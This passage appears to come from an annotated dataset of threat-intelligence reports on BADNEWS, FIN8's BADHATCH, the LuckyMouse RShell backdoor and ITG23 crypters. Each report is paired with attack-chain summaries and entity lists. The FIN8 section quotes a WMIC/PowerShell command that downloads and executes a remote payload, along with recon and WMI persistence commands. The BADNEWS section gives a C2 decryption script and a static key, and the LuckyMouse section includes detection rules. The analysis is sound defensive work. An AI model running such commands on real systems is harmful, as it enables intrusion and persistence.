given moment. This malware family used the new mutex ‘com_mycompany_apps_appname_new’. This variant of BADNEWS uses different filenames compared to previous versions. The following filenames are used by BADNEWS throughout its execution. All of these files reside in the victim’s %TEMP% directory:Filename Contains victim unique identifier Keystroke logs List of interesting files Temporarily holds screenshot when given command by C2 Temporarily contains downloaded file to be executed when given command by C2Other changes we noticed in this variant include how the malware obfuscates C2 information stored via dead drop resolvers. Previous variants of BADNEWS looked for data between ‘{{‘ and ‘}}’, and used a simple cipher to decode this data. This new variant now looks for data between ‘[[‘ and ‘]]’ in a number of hardcoded URLs. This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:Convert webpages to pdf online with PDFmyURLFigure 7 Dead drop resolver used by BADNEWSIn order to decrypt this data, the authors have included additional steps from previous versions. To decode this information, BADNEWS takes the following steps:1. Base64-decode the string 2. Perform the decoding cipher used in previous versions 3. Base64-decode the result 4. Decrypt the result using the Blowfish algorithm and a static keyA script, which is included in the Appendix, will decrypt data from these dead drop resolvers. In the example shown above, we are presented with a result of 185.203.118[.]115 after all four steps are taken. BADNEWS performs many of the expected functions associated with previous versions including keylogging and identifying files of interest. Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files. Instead, it looks at fixed drives only. It continues to seek out files with the following extensions:.xls .pptxConvert webpages to pdf online with PDFmyURL.pdfIn order to prepare for C2 communication, BADNEWS will aggregate various victim information, which is appended to two strings. These strings have the following format:1 uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.01 uuid=[Victim ID]#un=[Username]# It should be noted that the variables used for this string are different from previous versions. For example, in the previous variant of BADNEWS, the victim’s unique identifier was stored under a variable named ‘uid’, the username was stored in a variable named ‘u’, etc. Additionally, the hardcoded version string of ‘1.0’ is different from previous samples. C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:Command Description Upload edg499.dat, which includes the list of interesting files. Spawn a new instance of BADNEWS after. Upload the file specified by the C2. Upload the TPX498.dat file, which contains the list of collected keystrokes. Copy file to adbFle.tmp, and upload it to the C2. Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2. Download specified file to %TEMP%\up and execute it in a new process5 813 2333Convert webpages to pdf online with PDFmyURLDuring C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP. The following hardcoded URI is used for normal communication with the C2 (note the additional created strings containing the victim’s information. An example request in a sandboxed environment may be seen below:Figure 8 Example request made by BADNEWSTo decrypt the data provided in the POST request, a number of steps are required. First, the attackers include a series of extra ‘=’ and ‘&’ characters within the data stream. Once these are removed, the data is decoded with base64. Finally, the result is decrypted using AES-128 and the following static key (hex-encoded):DD1876848203D9E10ABCEEC07282FF37Conclusion The Patchwork group continues to plague victims located within the Indian subcontinent. Through the use of relatively new exploits, as well as a constantly evolving malware toolset, they aim toConvert webpages to pdf online with PDFmyURLcompromise prominent organizations and individuals to further their goals. Recent activity has shown a number of lures related to the Pakistan Army, the Pakistan Atomic Energy Commission, as well as the Ministry of the Interior. One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server. Palo Alto Networks customers are protected against this threat in a number of ways:Traps blocks the exploit documents witnessed during this campaign WildFire accurately identifies the samples mentioned in this blog as malicious The Patchwork and BADNEWS tags in AutoFocus may be used for continued monitoring and tracking of this threat.Additionally, the providers being used for dead drops have been notified. Indicators of Compromise Malicious Word Document SHA256 Hashes BADNEWS SHA256 Hashes C2 ServersConvert webpages to pdf online with PDFmyURL185.203.118[.]115 94.156.35[.]204 Dead Drop Resolvers hxxp://feed43[.]com/8166706728852850.xml hxxp://feed43[.]com/3210021137734622.xml hxxp://www.webrss[.]com/createfeed.php?feedid=49966 hxxp://feeds.rapidfeeds[.]com/88604/ Script to Decrypt Dead Drop Resolvers1 from Crypto.Cipher import Blowfish from struct import pack rol = lambda val, r_bits, max_bits: (val << r_bits%max_bits) & (2**max_bits-1) | ((val & (2**max_bits ror = lambda val, r_bits, max_bits: ((val & (2**max_bits-1)) >> r_bits%max_bits) | (val << (max_bits def unhexData(d): if len(d) % 2: d = d.zfill(len(d)+1) return ord(binascii.unhexlify(d)) def decodeDecrypt(data): decdata = '' for x in range(len(data)): x = x*2 if x < len(data): c = unhexData(data[x]) add_num = unhexData(data[x+1]) c = c << 4Convert webpages to pdf online with PDFmyURLc = (c + add_num) & 0xff c ^= 0x23 c = rol(c, 3, 8) decdata += chr(c) data2 = base64.b64decode(decdata) key = binascii.unhexlify(""F0E1D2C3B4A5968778695A4B3C2D1E0F0011223344556677"") cipher = Blowfish.new(key, Blowfish.MODE_ECB) dec = cipher.decrypt(data2) ""url"" for d in urls: r = requests.get(d) body = r.text r = re.search(""\[+\s*([a-zA-Z0-9\=]+)\]+"", body) if r: data = base64.b64decode(r.group(0)) print(""[{}] Decrypted C2: {}"".format(d, decodeDecrypt(data).split(""\x00"")[0]))28 49Got something to say?Leave a comment Notify me of followup comments via e-mailName (required)Convert webpages to pdf online with PDFmyURLName (required)Email (required)WebsiteSUBMITSUBSCRIBE TO NEWSLETTERSEmailSUBSCRIBECOMPANY Report a VulnerabilityLEGAL NOTICES Privacy Policy Terms of Use© 2016 Palo Alto Networks, Inc. All rights reserved.ACCOUNT Manage Subscription  SALES > 866.320.4788 SEE A DEMO TAKE A TEST DRIVEConvert webpages to pdf online with PDFmyURL ","1. The group sends weaponized Microsoft Word documents containing EPS exploits for CVE-2015-2545 and CVE-2017-0261. 2. If the victim opens the document, the exploit shellcode is triggered, dropping three files. 3. VMwareCplLauncher.exe executes and loads the malicious vmtools.dll. 4. vmtools.dll creates a scheduled task to persistently run MSBuild.exe, which is the BADNEWS malware. 5. BADNEWS collects encrypted C2 information from public websites acting as ""dead drop"" resolvers. 6. BADNEWS decrypts the C2 data and sends victim system info to the C2 server. 7. BADNEWS can receive commands from the C2 server to carry out additional malicious activities. ",valid_8,"['the group', 'Microsoft Word', 'documents', 'EPS exploits', 'CVE-2015-2545', 'CVE-2017-0261', 'the victim', 'three files', 'VMwareCplLauncher.exe', 'loads', 'Us', 'DLL', 'a scheduled task', 'the BADNEWS malware', 'C2 information', 'Decrypt', 'the C2', 'data', 'commands']",the group; Microsoft Word; documents; EPS exploits; CVE-2015-2545; CVE-2017-0261; the victim; three files; VMwareCplLauncher.exe; loads; Us; DLL; a scheduled task; the BADNEWS malware; C2 information; Decrypt; the C2; data; commands.
"businessinsights.bitdefender.com /deep-dive-into-a-fin8-attack-a-forensic-investigation Deep dive into a FIN8 attack – A forensic investigation Martin Zugec ⋮During a recent investigation, our researchers encountered a new version of the BADHATCH malware used by the well-known threat actor, FIN8. We previously reported that FIN8 was working on a new version of the BADHATCH malware - and this recent attack supports our findings and conclusions. FIN8 is known for taking extended breaks to improve their tactics, techniques, and procedures (TTPs) which increases their success rate. With each new version of their toolkit, they start with small tests on a limited pool of victims before launching a full-scale attack.One of the best defensive tools the security community has is to openly share details about these early attacks to improve our defensive toolkits.The objective of this blog post is to provide insights into an attempted attack by FIN8 on one of our customers, and how we worked with the customer to thwart the attack before it could fully develop. Through sharing forensic analysis of the attack, we hope this threat intelligence can help other organizations targeted by FIN8. FIN8’s Tried and True MethodsFIN8 targets financial services and POS (point of sale) systems primarily through “living off the land” attacks – using built-in tools and interfaces (like PowerShell or WMI) and abusing legitimate services like sslip.io to disguise their activity. A combination of preventive capabilities (to slow down attackers and generate early indicators) and detect & respond capabilities is necessary to stop professional adversary groups such as FIN8.NOTE: Prefixes are assigned to a threat group when a group is classified. Common prefixes are APT (Advanced Persistent Threat), FIN (Financially Motivated), or TEMP/TMP/UNC (Uncategorized). You can read more about this from MITRE. Unfortunately, there is no central authority for assigning names, so it is common for the adversary group to have many assigned aliases from different researchers. Anatomy of an AttackWhile the initial infection vector remains unclear, based on previous attacks by this group, it is understood that FIN8 most likely used social engineering techniques and spear-phishing campaigns for the initial compromise (read our analysis of FIN8 BADHATCH).Network ReconnaissanceWe know that at least two user accounts were compromised in the aforementioned attack. The first evidence of a compromise was detected on one of the database servers. Once on the network, the attackers engaged in network reconnaissance and retrieved a list of trusted domains and a list of domain controllers with the following commands: nltest.exe /domain_trusts nltest.exe /dclist:<domain>1/4Lateral MovementAfter their initial reconnaissance, the malicious actors spread across the network expanding their foothold by, primarily, targeting domain controllers. They engaged in lateral movement by using the WMIC utility for remote code execution (a built-in Windows tool). wmic.exe /node:<target> process call create ""cmd /c powershell.exe -nop -ep bypass -c System.Net.WebClient).DownloadString('url""WMIC (wmic.exe) was used to create a remote command prompt instance (cmd.exe), which then executed the PowerShell code. The PowerShell command created two variables and attempted to download and execute the payload from one of FIN8’s Command and Control (C&C) servers. This download was blocked by Bitdefender – below description is based on interpretation of variables discovered in our previous analysis of FIN8 operations.$pw – Probably password to decrypt the downloaded script file. Because download was blocked, we couldn’t analyze the script. $pa – Instructions for malicious framework to impersonate the lsass.exe/vmtoolsd.exe token and inject itself into a new “svchost.exe -k netsvcs” process.Finally, command line tried to execute (iex is an alias for Invoke-Expression) the code downloaded from the IP address 104[.]168[.]237[.]21. Threat actors abused sslip.io for connection to C&C - a service that provides free IP to domain mapping to make SSL certificate generation easier for traffic encryption. While this service is legitimate and widely used, the malware abused it in an attempt at evading detection when connecting to C&C servers.For one of the machines, a slightly different URL was observed (ending with /edaea0) with the identical $pw and $pa variables. The scripts downloaded from sslip.io were unavailable at the time of this analysis as the server was down.This attempt was blocked by Bitdefender’s command line scanning capability. To avoid the command line scanning, attackers then switched the attack tool to wmiexec.py from Impacket (a collection of Python classes to work with low-level access to packets and network protocols). This Python script connected directly to the target machine (without installing any service/agent on the target machine) and used the valid credentials to execute the code.NOTE: As a result of using wmiexec.py, the command lines we noticed on affected machines have specific output security controls. Via trial and error, they were eventually able to take over some of the servers. One script used by the malicious actors, C:\Windows\Temp\rdp.ps1,was unavailable at the time of this analysis, and we believe it was an attempt to use RDP tunneling (FIN8 has been known to use Plink for RDP tunneling).Establishing PersistencyAfter successful lateral movement, the attackers tried to establish persistency on selected servers –targeting all domain controllers, but also other servers. To achieve persistency, they used WMI Event Subscription with a few different WMI objects.Persistency was established on servers using commands such as: cmd.exe cmd.exe /Q /c powershell.exe -nop -ep bypass -c C:\sldr.ps1 used as a decryption key. The decrypted script is used to select a .NET binary based on the architecture type (x86 or x64), create WMI objects used for persistence (described later) and create a WMI event trigger. Three objects are created in WMI to support the persistency.2/4The first object (root\cimv2\Win32_Base64Class) has a property Prop that contains the code of the payload. This is used to store the payload in the WMI object.The second object (root\subscription\PerfData) contains a command to retrieve and execute this payload. This is what is known as a fileless attack - the binary is loaded into memory and a static method .StartCheck() is executed: powershell.exe -nop -c [System.Reflection.Assembly]::Load(([WmiClass]'root\cimv2:Win32_Base64Class').Properties['Prop'] [MSDAC.PerfOSChecker]::StartCheck()Finally, the third object (root\subscription\PerfOs) handles persistency. It executes the previous PowerShell command when system uptime reaches a certain value (140 seconds after boot up of the system): SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 140 AND TargetInstance.SystemUpTime < 240The entry point of the stored .NET code is the method [MSDAC.PerfOSChecker]::StartCheck(). Once executed, it decrypts and executes a shellcode that downloads its next stage shellcode by contacting the following domains:api-cdn[.]net git-api[.]com api-cdnw5[.]netAfter analyzing the shellcode, Bitdefender was able to download a DLL file that is used in the next stage of attack. Depending on the architecture, the shellcode downloads the it is able to collect system information like computer name and volume information and it communicates with the same domains as the shellcode. These files are not detected by any AV product (per VirusTotal) at the time of discovery and have been signed by Bitdefender in the meantime (see file hashes in the IOCs section below). FIN8 Response RecommendationsFIN8 typically targets the financial sector with a goal to compromise institutions and POS networks. In this attack, Bitdefender was able to block a number of malicious actions, thus preventing the attack from fully developing. An important element in this scenario was the expertise of the MDR team who quickly attributed the attack to a known adversary group and proactively worked with the customer to thwart the attempt.To protect your business from attacks such as this in the future, separate your POS from the networks used by employees or guests and monitor access to it. The combination of prevention tools with detection and response tools are critical to help protect your business. Remember, groups like FIN8 can stealthily infiltrate networks over many months, so regularly have your security vendors validate their approach by staying on top of new threats in your industry.Indicators of CompromiseSpecific pre-execution detection for novel tools and artifacts of this attack have been added to Bitdefender products (Trojan.GenericKD.46463307, Trojan.GenericKD.46463302, Trojan.GenericKD.37075281,3/4Trojan.GenericKD.37075888). The malicious domains used in this attack were also blacklisted in our traffic scan engine.Domains api-cdn[.]net git-api[.]com api-cdnw5[.]net 104-168-237-21.sslip[.]io URLs url url File Names and Locations C:\Windows\Temp\sldr.ps1 C:\Windows\Temp\s.ps1 C:\sldr.ps1 C:\Users\Public\s.ps1We would like to thank Dragos Teodor Gavrilut, Victor Vrabie, Cristina Vatamanu and Bogdan “Bob” Botezatu for their help with putting this report together.4/4 ","1. Initial compromise of user accounts through unknown means, likely phishing. 2. Network reconnaissance using nltest.exe to gather domain trusts and controller info. 3. Lateral movement with WMIC for remote code execution to distribute PowerShell script. 4. PowerShell script downloads payload from FIN8 C2 server. 5. Payload execution blocked by Bitdefender, attackers pivot to wmiexec.py. 6. Persistence established via WMI event subscriptions. 7. Persistence scripts decrypt and load next-stage .NET binaries from WMI. 8. Downloaded binaries collect system info and communicate with FIN8 domains. 9. Full capabilities of new malware still being analyzed, but assessd to be new version of FIN8's BADHATCH. ",valid_85,"['Initial compromise', 'user', 'network reconnaissance', 'nltest.exe', 'Control', 'lateral movement', 'WMIC', 'remote code execution', 'PowerShell', 'download', 'payload', 'FIN8', 'Bitdefender', 'attackers', 'iex', 'persistence', 'WMI Event Subscription', 'decrypt', 'system info', 'Domains', 'capabilities', 'new version']",Initial compromise; user; network reconnaissance; nltest.exe; Control; lateral movement; WMIC; remote code execution; PowerShell; download; payload; FIN8; Bitdefender; attackers; iex; persistence; WMI Event Subscription; decrypt; system info; Domains; capabilities; new version.
"blog.sekoia.io /luckymouse-uses-a-backdoored-electron-app-to-target-macos/ LuckyMouse uses a backdoored Electron app to target MacOS ⋮ 8/12/2022This blog post on LuckyMouse is an extract of the “FLINT 2022-045 – LuckyMouse uses a backdoored Electron app to target MacOS” report (SEKOIA.IO Flash Intelligence) sent to our clients on August 10, 2022.Note: TrendMicro has published on the same campaign under the title : “Iron Tiger Compromises Chat Application Mimi, Targets Windows, Mac, and Linux Users“. SummaryDuring a review of the HyberBro Command and Control (C2) infrastructure linked to China-nexus LuckyMouse intrusion set, SEKOIA spotted an unusual connection with an application. Further investigation led to identify this application as “MìMì” ( – “secret”, aka Mi). Mimi is a Chinese-speaking Electron App developed by Xiamen Baiquan Information Technology Co. Ltd. SEKOIA established that “MìMì” Messenger’s MacOS version is trojanized since May 26, 2022 to download and execute a Mach-O binary dubbed “rshell”.At this stage, SEKOIA is not able to assess the objective of this campaign. As this application’s use in China appears low, it is plausible it was developed as a targeted surveillance tool. It is also likely that, following social engineering carried out by the operators, targeted users are encouraged to download this application, purportedly to circumvent Chinese authorities’ censorship.This is not the first time a messaging application dropping an implant connecting to the LuckyMouse infrastructure is observed. In 2020, our ESET fellows uncovered compromised versions of Able Desktop, a messaging application widely used in Mongolia in the “StealthyTrident” operation. In this campaign, Able Desktop was used to drop several implants, including PlugX, Tmanger and HyperBro, known to be a part of the LuckyMouse tool set.However, this is the first time that SEKOIA observed LuckyMouse targeting MacOS. Moreover, if this application is exclusively used by Chinese citizens, it would be the first time that we identified LuckyMouse involved in domestic surveillance. This FLINT presents our findings on this campaign, including a description of the Rshell implant, and associated IOCs. “MìMì” Messenger backdooringThe “Mi” Application is an Electron messaging app available for Android, iOS, Windows and MacOS platforms. As Mi is not widely promoted, and its related website (www.mmimchat[.]com) doesn’t display a detailed description, general conditions of use or social media links, SEKOIA rapidly questioned its legitimacy.Figure 1. Mimi website at www.mmimchat[.]comMoreover, the website hosted files were last modified on July 26. Based on the Apple Store change logs and Passive DNS, we figured that the first traces of this application dates back to June 2020. However, SEKOIA was not able to assess whether this application is legit, or if it was designed or repurposed as a surveillance tool. Additionally, based on our open source investigations, it is not possible to assess whether Xiamen Baiquan Information Technology Co. Ltd. is a legit or a shell company.The MacOS version of the “Mi” Application is an ElectronApp packaged in an Apple Disk Image file. This application seems to be functional, where end users simply register themselves to be able to discuss with their contacts. However, in version 2.3.0, published on May 26 2022, the ./mimi.app/Contents/Resources/app/electron- main.js file was trojanized. As shown below, this was implemented by placing a Dean Edwards Packed JavaScript code at the beginning of the module.exports function.1/5Figure 2. Backdoored electron-main.js file.This code, executed at the runtime, checks if the environment is MacOS (darwin) and then downloads the “rshell” is written in the temp folder, chmoded with execution permission and then, executed as shown in the deobfuscated code:Figure 3. Code responsible for downloading and executing RShell.While SEKOIA analysts checked Windows, iOS, and Android versions of the app, no backdoor was found in the current versions. However, TrendMicro found old Linux and Windows versions backdoored. Read their analysis here.RShell Mach-O implantThe downloaded implant, named RShell by its developers, is written in C++ and embeds the Boost.Asio and nlohmann/json libraries. This backdoor uses BJSON (Binary JSON) over TCP sockets to communicate with its command and control server, without any encryption and does not display a persistence mechanism.Upon execution, RShell backdoor attempts to connect with the C2 server. This “Hello message” to the C2 server contains:a random GUID, added to each response to the C2 server the hostname the IPv4 adresses the type of connection (“login” for instance) the current username the kernel version.2/5Figure 4. Hello packet from the implant.RShell backdoor accepts two “types” of commands: “cmd” and “file”.The group “cmd” contains three commands:init(): start a bash data(data): write data to the bash close(): ends up the bash.The second type of commands, “file”, enable interactions with the filesystem:dir(path): returns a list of files and subdirectories for the specified path init(): returns a list of files and subdirectories for the root filesystem (equivalent to dir(“/”)) down(path): opens a file in binary and read-only mode and returns the size of the file read(path): reads the specified file. The file must first have been opened with the down command upload(path): opens a file in binary and write-only mode write(data, path): writes data to the specified file. As for the read command, the file must first have been opened with the upload command before del(path): delete the specified file or directory close(path): closes the fileThe following figures present an example of request and response for the dir command.Figure 5. Example of dir requestFigure 6. Example of dir responseA keepalive message is sent to the C2 server every 40 seconds. The server must echo this message. Based on this observation, we created a Suricata rule to spot this threat in your network flows (see Appendix).3/5Links with LuckyMouseInfrastructure links were established between China-nexus Intrusion Set LuckyMouse and this operation.Of note, in the course of our investigation, the same HTTP server also served a HyperBro which was configured to communicate over HTTPs to 139.180.216[.]65. The malicious DLL of this HyperBro sample was signed by a certificate known to be stolen and then used by LuckyMouse. The files launching this sample were accessible at the 103.79.76[.]232, 103.79.78[.]48), two RShell C2 were also identified at 103.79.76[.]88 and 103.79.77[.]178.Finally, as documented by ESET, compromised messaging applications were already leveraged by LuckyMouse in past activities and this Intrusion Set was observed using Dean Edwards Javascript packer in previous watering hole campaigns.ConclusionBased on our investigations, SEKOIA associate this activity to LuckyMouse with high confidence. It is plausible this activity indicates an expansion of LuckyMouse’s mandate, now including surveillance. However, as this Intrusion Set was mostly observed continuously carrying out espionage activities, notably against the technology and governmental sectors, SEKOIA assess this hypothesis is unlikely.At the time of writing, SEKOIA refrains from making any assessment on the Intrusion Set’s motivation and will continue to closely monitor their activities. Regardless of LuckyMouse’s goals, it is of particular interest to observe the targeting of MacOS environment. SEKOIA assess this Intrusion Set will continue updating and improving their capabilities in the short-term.Discover our CTI and XDR products IOCs & Technical DetailsRelated infrastructure 103.79.76[.]88 103.79.77[.]178 139.180.216[.]65RShell hashes Warning: dlpumgr32.exe is a legit file id = ""89f18013-ea3e-440f-821e-cef102a43b7b"" version = ""1.0"" description = ""Detects LuckyMouse RShell Mach-O implant"" source = ""SEKOIA""4/5creation_date = ""2022-08-05"" classification = ""TLP:WHITE"" strings: $ = { 64 69 72 00 70 61 74 68 00 64 6F 77 6E 00 72 65 61 64 00 75 70 6C 6F 61 64 00 77 72 69 74 65 00 64 65 6C } $ = { 6C 6F 67 69 6E 00 68 6F 73 74 6E 61 6D 65 00 6C 61 6E 00 75 73 65 72 6E 61 6D 65 00 76 65 72 73 69 6F 6E } condition: uint32be(0) == 0xCFFAEDFE and filesize < 300KB and all of them id = ""7702217d-771f-47af-8eaa-d5acf1e14f4d"" version = ""1.0"" intrusion_set = ""LuckyMouse"" description = ""Detects compromised ElectronApp"" source = ""SEKOIA"" creation_date = ""2022-08-05"" classification = ""TLP:WHITE"" strings: $s = ""module.exports=function(t){eval(function(p,a,c,k,e,r)"" condition: $s at 0 and filesize < 100KB }Suricata rule alert tcp $HOME_NET any -> $EXTERNAL_NET any (flow: from_client, established;content:""|19 00 00 00 02 74 79 70 65 00 0a 00 00 00 6b 65 65 70 61 6c 69 76 65 00 00|"";dsize:25;msg:""Detects a LuckyMouse RShell beaconing packet"";sid:XXXXXXXXX; rev:001; threshold: type limit, track by_src, seconds 500, count 1;)5/5 ","1. LuckyMouse compromises the Mimi messaging application and backdoors the MacOS version. 2. The backdoored Mimi app is distributed through unknown means (possibly social engineering) to targets. 3. Users install and launch the Mimi app on their MacOS systems. 4. The backdoored Mimi app downloads the RShell implant from a LuckyMouse C2 server. 5. RShell is installed to the temp directory, set as executable, and executed. 6. RShell connects to LuckyMouse C2 infrastructure to receive commands. 7. LuckyMouse operators send commands to gather system info and interact with the filesystem. 8. Data is exfiltrated from the compromised system back to LuckyMouse. 9. LuckyMouse leverages the compromised access to move laterally and compromise additional systems/data. ",valid_9,"['LuckyMouse', 'Mimi', 'the MacOS version', 'social engineering', 'targets', 'Users', 'the Rshell implant', 'C2', 'set', 'infrastructure', 'commands', 'the filesystem', 'Data']",LuckyMouse; Mimi; the MacOS version; social engineering; targets; Users; the Rshell implant; C2; set; infrastructure; commands; the filesystem; Data.
"securityintelligence.com /posts/itg23-crypters-cooperation-between-cybercriminal-groups/ ITG23 Crypters Highlight Cooperation Between Cybercriminal GroupsMalware May 19, 2022By Charlotte Hammond co-authored by Ole Villadsen , Golo Mühr 25 min readIBM Security X-Force researchers have continually analyzed the use of several crypters developed by the cybercriminal group ITG23, also known as Wizard Spider, DEV-0193, or simply the “Trickbot Group”. The results of this research, along with evidence gained from the disclosure of internal ITG23 chat logs (“Contileaks”), provide new insight into the connections and cooperation between prominent cybercriminal groups whose attacks often lead to ransomware.Crypters are applications designed to encrypt and obfuscate malware to evade analysis by antivirus scanners and malware analysts. Crypters generally operate by encrypting the pre-compiled malware payload and embedding it within a secondary binary, known as a stub, which contains code to decrypt and execute the malicious payload. The use of crypters allows malware developers to easily experiment with different methods of evading antivirus detection without having to make changes to the malware itself.X-Force analyzed thirteen crypters that have all been used with malware built or operated by ITG23 internal teams or third-party distributors — including Trickbot, BazarLoader, Conti, and Colibri — as well as malware developed by other groups such as Emotet, IcedID, Qakbot, and MountLocker. The presence of one of these crypters on a file sample is a strong indication that its developer, distributer, or operator is either a part of ITG23 or has a partnership with the group.X-Force found evidence that ITG23 by mid-2021 scaled up their efforts to crypt malware with the development of several new crypters and the construction of a Jenkins build server to automate the crypting of malware at scale. X- Force also observed the analyzed crypters used repeatedly by Emotet and IcedID malware samples, indicating ITG23 is also crypting malware for these groups. These findings add to a growing body of evidence indicating a close relationship between ITG23 and the threat actors behind the development and operation of IcedID and Emotet.Additionally, X-Force uncovered that at least one ITG23 crypter has been used repeatedly since late February 2022 with the Qakbot banking trojan and at least once with the Gozi banking trojan likely delivered by the ITG23 distribution affiliate TA551 (tracked by X-Force as Hive0106). X-Force’s analysis of these crypters has also uncovered a previously undisclosed relationship between the IcedID group and MountLocker ransomware-as-a-service (RaaS) operation. A Tangled Web They Weave ITG23’s “Build Machine”ITG23 is a cybercriminal gang known primarily for developing the Trickbot banking Trojan, which was first identified in 2016 and initially used to facilitate online banking fraud. The group since that time expanded its operations to develop and operate new malware such as BazarLoader and Anchor. ITG23 also adapted to the ransomware economy by using its payloads to gain a foothold in victim environments for ransomware attacks and developing and operating the Conti and Diavol RaaS operations. ITG23 is best thought of as a group of groups, not unlike a large corporation, who report to common “upper management” and share infrastructure and support functions, such as IT and human resources. One of these support groups within ITG23 is dedicated to developing crypters for use with the group’s own malware operations as well as for several other groups.ITG23 have been crypting their malware for several years, and crypters used by the group were regularly seen in use with malware such as Trickbot, Emotet, Cobalt Strike and Ryuk. However, the development of multiple new crypters1/19during the past year suggests a focused effort to scale up their crypting operation.Evidence gained from several sources, including ContiLeaks, indicates that ITG23 has set up a Jenkins build server to automate the mass crypting of malware, also referred to as the “Build Machine”. Jenkins is an open-source automation server designed to automate the building, testing, and deploying of software. The “Build Machine” was created in April 2021, coinciding with an increase in the use of crypters with malware developed by ITG23 and other groups.Since that time, ITG23 crypters have been applied to:Malware used to gain a foothold in victim environments, such as Trickbot, BazarLoader, Sliver, IcedID, Emotet, Qakbot, and Gozi. We even identified ITG23 crypters with Colibri, a loader advertised on underground forums that was used to download Trickbot in fall of 2021, likely by an internal ITG23 distribution affiliate. Some of these malware families are built by ITG23, such as Trickbot and BazarLoader, and others are built by different groups, such as IcedID, Emotet, and Qakbot. ITG23 distribution affiliates have deployed Sliver, an open source, cross-platform adversary simulation and red team platform, probably to gain access for ITG23 internal red teams to conduct ransomware attacks. Cobalt Strike beacon samples downloaded during attacks commencing with the above malware and used by internal red teams or other affiliates when performing ransomware attacks. Ransomware such as Conti and MountLocker, also known as Xinglocker, AstroLocker, and Quantum, which are often deployed following an infection with the above tools and malware.ITG23 has discontinued use of Trickbot and BazarLoader as of December 2021 and February 2022, respectively, but X-Force continues to observe the crypters leveraged by other malware, including IcedID, Emotet, Conti, Qakbot, and the adversary simulation software Cobalt Strike. One notable exception is the Anchor malware which although attributed to ITG23 does not tend to use the same crypters as the other malware mentioned throughout this report. The Anchor malware was commonly observed using a separate crypter, named ShellStarter, which has some code overlap with Anchor itself and was likely created by the same developer. The ShellStarter crypter was also regularly used with Cobalt Strike payloads, but otherwise did not seem to be used for general crypting operations. We are also currently analyzing Bumblebee malware samples which we have also linked to ITG23 to determine if they are using an ITG23 crypter.ContiLeaksIn February 2022, a Ukrainian security researcher using the Twitter handle “ContiLeaks” revealed a wealth of information about ITG23 and its operations, including private conversations between its members. While these leaks appeared to concentrate on the Conti RaaS operation, they also show that it was part of the larger ITG23 “corporation” which also includes ITG23’s crypting operation. These chats indicate that the head of this crypting operation uses the handle “Bentley”, who manages a team of developers responsible for both developing the crypters and crypting malware for affiliates and partners. Bentley in turn regularly provides status reports to “Mango”, a more senior manager within ITG23 who reports to the group’s former leader “Stern.” Other security researchers have also identified Bentley and his role managing the crypting team. Below is an example of a status update on malware crypting that Bentley would send on a regular basis to Mango. Date: Aug 26, 2021 @ 11:08:21.000 From: bentley@q3mcco35auwcstmt.onion To: mango@q3mcco35auwcstmt.onion Message: Проект лео - 13 криптов. Билд машина (Project leo - 13 crypts. Build Machine) БК (BK) группа 15: 20 криптов, билд машина (group 15: 20 crypts, build machine) группа 19: 5 крипта, билд машина (group 19: 5 crypts, build machine) группа 20: 1 крипто, билд машина (group 20: 1 crypt, build machine) Трик: (Trick) 4 длл: 2 сэм 2 невил (4 dll: 2 sam 2 nevil) Тройка: (Troika:)2/19невил (nevil) Шелкод: билд машина (Shellcode: Build Machine) Кобальт: билд машина (Cobalt: Build Machine)Chat logs from the ContiLeaks also provide details about the creation of the build machine. On April 15, 2021, Mango informed Stern that the build machine for the crypters would be ready by the end of April 2021. Mango → Stern: билд машина для крипторов будет готова к концу месяца, вчера уже начали обкатывать ее но пока сыровата (The build machine for cryptors will be ready by the end of the month, yesterday they already started to run it in, but it’s still raw)On June 7, 2021, Bentley provides an update to Stern on the status of the transition of work to the build machine. Bentley → Stern: Дела - хорошо. Интересно и насыщено. Все крипторы перешли из ручного труда в автоматическуй сборку через билд машину. Теперь они занимаются актуализацией и чисткой стабов. А файлы я делаю на билд машине, проверяю и выдаю. Если что-то билдится грязным - обращаюсь к криптору. Он чистит стаб. Снова проверяем и 1. Криптование файлов для Лео на билд машине. 2. Шелкод кобальт 3. Локеры 4. Коабальт ехе и длл 5. dll трика 6. Обучаю и предоставлюя доступ другим членам команды к билд машине, чтобы они могли сами собирать крипты. 7. Подготовака линков для нагрузки и тестирование ехелей для netwalker, hash, cherry. Everything is OK. Interesting and rich. All cryptors have moved from manual labor to automatic assembly through the build machine. Now they are engaged in updating and cleaning stubs. And I make files on the build machine, check and issue. If something is being built dirty, I turn to cryptor. He cleans the stub. Check again 1. Crypting files for Leo on the build machine. 2. Cobalt shellcode 3. Lockers 4. Cobalt exe and dll 5. Trickbot dll 6. Educate and give other team members access to the build machine so that they can collect the crypts themselves. 7. Preparing links for loading and testing excels for netwalker, hash, cherry.Within the ContiLeaks, there are multiple references to the use of a Jenkins server for the Build Machine. In one such example, on January 17, 2022, two ITG23 developers “derekson” and “elon” discuss the Jenkins server. X-Force also uncovered Program Database (PDB) file paths used by ITG23 crypters that reference Jenkins (see below for more details). Derekson → Elon: Привет. Почти закончил со вторым сервером. Скажи когда можно подключить к дженкинсу для теста?3/19(Hello. Almost finished with the second server. Tell me when can I connect to jenkins for a test?)Throughout the leaked chats, there are multiple examples of Bentley delivering crypted malware samples to affiliates and partners such as Cherry, Netwalker, and Zeus. X-Force assesses that “zevs” (“zeus”) is affiliated with the prominent distribution group Hive0106 (aka TA551), which used the gtags ‘zev,’ ‘zem’ and ‘zvs’ during their Trickbot campaigns. Hive0106 is a prominent distribution affiliate with an established relationship with ITG23. Throughout the chats, “zeus” is alternatively translated as “зевса”, “зевсом”, “зевсу”, and “зевс” depending on the grammatical case.For example, on Aug 10, 2021, Bentley sends the following request to Hof, a developer associated with Trickbot malware: Bentley → Hof: Доброе утро. Сделай, пожалуйста, zev4.dll и zem1.dll для Зевса (Good morning. Please make zev4.dll and zem1.dll for Zeus)The following messages also indicate crypted samples were prepared for Zevs: August 31, 2021: Bentley → Zevs: Еще ответ: у нас есть опыт серийной выдачи криптов п БК* уже, один заказчик берет партиями по 30-100 штук (Another answer: we have experience in the serial 